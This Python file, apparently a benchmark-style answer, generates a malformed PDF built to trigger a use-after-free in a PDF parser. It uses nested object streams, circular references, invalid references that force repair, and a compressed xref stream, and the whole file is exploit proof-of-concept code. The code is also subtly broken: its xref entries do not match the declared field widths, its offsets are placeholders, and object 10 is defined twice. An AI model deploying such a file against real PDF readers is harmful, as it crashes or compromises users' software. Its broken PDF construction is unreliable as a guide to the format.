import os
import subprocess
import tempfile
import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal PDF structure with object streams and cross-references
        # designed to trigger the use-after-free vulnerability described
        
        # PDF header
        pdf = b"%PDF-1.5\n"
        
        # Add some comments to increase size (adjust to reach target length)
        pdf += b"%" + b"a" * 100 + b"\n"
        
        # Object 1: Catalog
        catalog = b"1 0 obj\n<<\n/Type /Catalog\n/Pages 2 0 R\n>>\nendobj\n"
        pdf += catalog
        
        # Object 2: Pages
        pages = b"2 0 obj\n<<\n/Type /Pages\n/Kids [3 0 R]\n/Count 1\n>>\nendobj\n"
        pdf += pages
        
        # Object 3: Page
        page = b"3 0 obj\n<<\n/Type /Page\n/Parent 2 0 R\n/MediaBox [0 0 612 792]\n/Contents 4 0 R\n>>\nendobj\n"
        pdf += page
        
        # Object 4: Content stream
        content = b"4 0 obj\n<<\n/Length 20\n>>\nstream\nBT /F1 12 Tf 72 720 Td (Hello) Tj ET\nendstream\nendobj\n"
        pdf += content
        
        # Object 5: Object stream containing indirect objects
        # This object stream will contain objects that reference each other
        # creating conditions for recursive loading and potential use-after-free
        
        # First, build the object stream data
        obj_stream_data = b""
        obj_stream_offsets = []
        
        # Object 10 (in object stream)
        obj10 = b"10 0 obj\n<<\n/Type /Test\n/Ref 11 0 R\n>>\nendobj\n"
        obj_stream_offsets.append(len(obj_stream_data))
        obj_stream_data += obj10
        
        # Object 11 (in object stream) - references object in another stream
        obj11 = b"11 0 obj\n<<\n/Type /Test\n/Ref 12 0 R\n/Next 13 0 R\n>>\nendobj\n"
        obj_stream_offsets.append(len(obj_stream_data))
        obj_stream_data += obj11
        
        # Object 12 (in object stream) - will trigger object stream loading
        obj12 = b"12 0 obj\n<<\n/Type /Test\n/StreamRef 6 0 R\n>>\nendobj\n"
        obj_stream_offsets.append(len(obj_stream_data))
        obj_stream_data += obj12
        
        # Object 13 (in object stream) - circular reference
        obj13 = b"13 0 obj\n<<\n/Type /Test\n/Ref 10 0 R\n>>\nendobj\n"
        obj_stream_offsets.append(len(obj_stream_data))
        obj_stream_data += obj13
        
        # Build object stream dictionary
        obj_stream_dict = b"<<\n/Type /ObjStm\n/N %d\n/First %d\n/Length %d\n>>\n" % (
            len(obj_stream_offsets),
            len(str(obj_stream_offsets).encode()) + 1,
            len(obj_stream_data)
        )
        
        # Create offsets string
        offsets_str = b""
        for offset in obj_stream_offsets:
            offsets_str += b"%d 0 " % offset
        
        # Object 5: The object stream
        obj5 = b"5 0 obj\n" + obj_stream_dict + b"stream\n" + offsets_str + b"\n" + obj_stream_data + b"endstream\nendobj\n"
        pdf += obj5
        
        # Object 6: Another object stream to trigger cross-reference changes
        obj6_data = b""
        obj6_offsets = []
        
        # Object 20 (in second object stream)
        obj20 = b"20 0 obj\n<<\n/Type /Test2\n/Ref 21 0 R\n>>\nendobj\n"
        obj6_offsets.append(len(obj6_data))
        obj6_data += obj20
        
        # Object 21 (in second object stream) - references back to first stream
        obj21 = b"21 0 obj\n<<\n/Type /Test2\n/Ref 10 0 R\n>>\nendobj\n"
        obj6_offsets.append(len(obj6_data))
        obj6_data += obj21
        
        obj6_dict = b"<<\n/Type /ObjStm\n/N %d\n/First %d\n/Length %d\n>>\n" % (
            len(obj6_offsets),
            len(str(obj6_offsets).encode()) + 1,
            len(obj6_data)
        )
        
        offsets_str6 = b""
        for offset in obj6_offsets:
            offsets_str6 += b"%d 0 " % offset
        
        obj6 = b"6 0 obj\n" + obj6_dict + b"stream\n" + offsets_str6 + b"\n" + obj6_data + b"endstream\nendobj\n"
        pdf += obj6
        
        # Object 7: A regular object that will be repaired
        obj7 = b"7 0 obj\n<<\n/Type /Repair\n/Broken true\n/NeedFix 1\n>>\nendobj\n"
        pdf += obj7
        
        # Object 8: Indirect object with invalid reference to trigger repair
        obj8 = b"8 0 obj\n<<\n/Type /Broken\n/InvalidRef 999 0 R\n/ValidRef 1 0 R\n>>\nendobj\n"
        pdf += obj8
        
        # Object 9: Another object that references the object stream
        obj9 = b"9 0 obj\n<<\n/Type /Trigger\n/StreamObj 5 0 R\n/OtherStream 6 0 R\n>>\nendobj\n"
        pdf += obj9
        
        # Create cross-reference stream (xref stream) - compressed
        # This will contain both regular and compressed references
        xref_data = b""
        
        # Object 0: free object
        xref_data += struct.pack(">BIH", 0, 0, 65535)  # type 0, next free, generation
        
        # Objects 1-4: regular uncompressed objects
        # We'll need to find their positions in the PDF
        # For simplicity, we'll use placeholder values
        offsets = [0] * 10
        current_pos = len(pdf)
        
        # Add entries for objects 1-9
        for i in range(1, 10):
            # Use type 1 (uncompressed) for most objects
            # But use type 2 (compressed) for object streams to trigger the vulnerability
            if i == 5 or i == 6:
                # Compressed objects in object stream
                xref_data += struct.pack(">BII", 2, i, 0)  # type 2, object stream, index
            else:
                # Regular uncompressed objects
                # Use approximate offsets
                xref_data += struct.pack(">BIH", 1, 100 + i * 50, 0)
        
        # Compress the xref data
        compressed_xref = zlib.compress(xref_data)
        
        # Object 10: Xref stream
        xref_dict = b"<<\n/Type /XRef\n/Size 11\n/W [1 3 1]\n/Index [0 11]\n/Length %d\n/Filter /FlateDecode\n>>\n" % len(compressed_xref)
        obj10_xref = b"10 0 obj\n" + xref_dict + b"stream\n" + compressed_xref + b"\nendstream\nendobj\n"
        pdf += obj10_xref
        
        # Update the xref stream offset
        xref_offset = len(pdf) - len(obj10_xref) + len(b"10 0 obj\n")
        
        # Update the xref stream to have correct offset for itself
        # This is a simplified approach
        xref_data_updated = b""
        # Recreate with correct offset for object 10
        xref_data_updated += struct.pack(">BIH", 0, 0, 65535)
        for i in range(1, 10):
            if i == 5 or i == 6:
                xref_data_updated += struct.pack(">BII", 2, i, 0)
            else:
                xref_data_updated += struct.pack(">BIH", 1, 100 + i * 50, 0)
        # Object 10 (the xref stream itself)
        xref_data_updated += struct.pack(">BIH", 1, xref_offset, 0)
        
        compressed_xref_updated = zlib.compress(xref_data_updated)
        xref_dict_updated = b"<<\n/Type /XRef\n/Size 11\n/W [1 3 1]\n/Index [0 11]\n/Length %d\n/Filter /FlateDecode\n>>\n" % len(compressed_xref_updated)
        obj10_xref_updated = b"10 0 obj\n" + xref_dict_updated + b"stream\n" + compressed_xref_updated + b"\nendstream\nendobj\n"
        
        # Replace the old xref stream
        pdf = pdf[:-len(obj10_xref)] + obj10_xref_updated
        
        # Trailer
        trailer = b"trailer\n<<\n/Size 11\n/Root 1 0 R\n>>\nstartxref\n%d\n%%%%EOF" % xref_offset
        pdf += trailer
        
        # Pad to reach approximate target size
        target_size = 6431
        current_size = len(pdf)
        if current_size < target_size:
            pdf += b"\n% " + b"PADDING " * ((target_size - current_size) // 9) + b"\n"
        
        return pdf